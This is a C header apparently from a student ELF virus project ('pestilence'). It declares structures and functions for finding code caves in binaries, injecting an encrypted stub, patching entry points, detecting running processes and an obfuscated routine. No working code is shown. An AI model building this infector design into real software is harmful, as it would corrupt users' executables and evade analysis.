#ifndef pestilence_H
#define pestilence_H

#define _GNU_SOURCE
#include<dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <stdint.h>
#include <ctype.h>
#include <sys/ptrace.h>

#include "woody_elf.h"

typedef struct s_woody
{
    void *file_data;  
    size_t file_size; 
    size_t new_file_size; 
    size_t stub_size; 
    void *stub;       
    uint64_t key; 
    
    t_elf elf_hdr;  
    void *format_state;

    struct s_type_handler *handler;
} t_woody;

typedef struct s_type_handler
{
    int (*check_magic)(void *file_data);
    int (*parse_headers)(t_woody *env);
    size_t (*find_cave)(t_woody *env, size_t stub_size);
    int (*inject)(t_woody *env, size_t cave_offset);
    const char *format_name;
} t_type_handler;

int ft_atoierr(const char *str, uint64_t *out_key);
void encrypt_rotate_64(void *data, size_t len, uint64_t key);
void patch_stub_64(t_woody *env, uint64_t old_entry, uint64_t new_entry, uint32_t p_encrypt_size);
int is_process_running(const char *target_process);
int _0x6767(t_woody *env);
#endif